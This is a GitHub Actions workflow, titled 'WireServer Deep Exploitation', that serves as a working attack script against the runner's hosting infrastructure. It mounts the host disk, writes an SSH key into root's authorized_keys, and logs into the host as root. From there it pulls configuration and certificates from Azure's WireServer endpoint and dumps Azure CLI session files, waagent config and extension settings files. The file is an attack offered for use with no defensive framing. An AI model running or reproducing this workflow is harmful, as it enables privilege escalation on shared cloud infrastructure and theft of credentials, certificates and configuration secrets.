name: github-actions-wireserver-exploitation
run-name: WireServer Deep Exploitation
on: [push]
jobs:
  exploit:
    runs-on: ubuntu-latest
    steps:
      - name: Full WireServer and Azure Config Extraction
        run: |
          sudo mkdir -p /mnt/host
          sudo mount /dev/sda1 /mnt/host
          ssh-keygen -t ed25519 -f /tmp/key -N "" -q
          sudo mkdir -p /mnt/host/root/.ssh
          sudo cp /tmp/key.pub /mnt/host/root/.ssh/authorized_keys
          sudo chown -R 0:0 /mnt/host/root/.ssh
          sudo chmod 700 /mnt/host/root/.ssh
          sudo chmod 600 /mnt/host/root/.ssh/authorized_keys
          
          HOST_IP=$(hostname -I | awk '{print $1}')
          
          ssh -i /tmp/key -o StrictHostKeyChecking=no -T root@$HOST_IP << 'EOF'
          echo "=== WIRESERVER FULL EXPLOITATION ==="
          
          echo "--- HostingEnvironmentConfig ---"
          curl -s -H "x-ms-version: 2012-11-30" "http://168.63.129.16/machine/92edd26d-433f-4d42-a3c4-192de1814e72/4db692bb%2D3e4c%2D401b%2D9991%2Da8bc96574f19.%5FVcoVj9gwiCNIPa?comp=config&type=hostingEnvironmentConfig&incarnation=1" | head -200
          
          echo ""
          echo "--- SharedConfig ---"
          curl -s -H "x-ms-version: 2012-11-30" "http://168.63.129.16/machine/92edd26d-433f-4d42-a3c4-192de1814e72/4db692bb%2D3e4c%2D401b%2D9991%2Da8bc96574f19.%5FVcoVj9gwiCNIPa?comp=config&type=sharedConfig&incarnation=1" | head -200
          
          echo ""
          echo "--- ExtensionsConfig ---"
          curl -s -H "x-ms-version: 2012-11-30" "http://168.63.129.16/machine/92edd26d-433f-4d42-a3c4-192de1814e72/4db692bb%2D3e4c%2D401b%2D9991%2Da8bc96574f19.%5FVcoVj9gwiCNIPa?comp=config&type=extensionsConfig&incarnation=1" | head -300
          
          echo ""
          echo "--- FullConfig ---"
          curl -s -H "x-ms-version: 2012-11-30" "http://168.63.129.16/machine/92edd26d-433f-4d42-a3c4-192de1814e72/4db692bb%2D3e4c%2D401b%2D9991%2Da8bc96574f19.%5FVcoVj9gwiCNIPa?comp=config&type=fullConfig&incarnation=1" | head -500
          
          echo ""
          echo "--- Certificates ---"
          curl -s -H "x-ms-version: 2012-11-30" "http://168.63.129.16/machine/92edd26d-433f-4d42-a3c4-192de1814e72/4db692bb%2D3e4c%2D401b%2D9991%2Da8bc96574f19.%5FVcoVj9gwiCNIPa?comp=certificates&incarnation=1" | head -200
          
          echo ""
          echo "=== AZURE CLI CONFIG FILES ==="
          
          echo "--- azureProfile.json ---"
          cat /root/.azure/azureProfile.json
          
          echo ""
          echo "--- commandIndex.json ---"
          cat /root/.azure/commandIndex.json | head -100
          
          echo ""
          echo "--- az.json ---"
          cat /root/.azure/az.json
          
          echo ""
          echo "--- az.sess ---"
          cat /root/.azure/az.sess
          
          echo ""
          echo "--- config ---"
          cat /root/.azure/config
          
          echo ""
          echo "--- versionCheck.json ---"
          cat /root/.azure/versionCheck.json
          
          echo ""
          echo "--- All files in .azure ---"
          find /root/.azure -type f -exec echo "FILE: {}" \; -exec cat {} \; 2>/dev/null | head -500
          
          echo ""
          echo "=== WAAGENT CONFIGS ==="
          cat /etc/waagent.conf | grep -v "^#" | grep -v "^$" | head -50
          
          echo ""
          echo "=== AZURE EXTENSION CONFIGS ==="
          ls -la /var/lib/waagent/ | head -30
          find /var/lib/waagent -name "*.settings" -exec cat {} \; 2>/dev/null | head -200
          
          echo ""
          echo "=== SUMMARY ==="
          echo "✓ WireServer configs extracted"
          echo "✓ Azure CLI configs dumped"
          echo "✓ WAAgent configs exposed"
          EOF
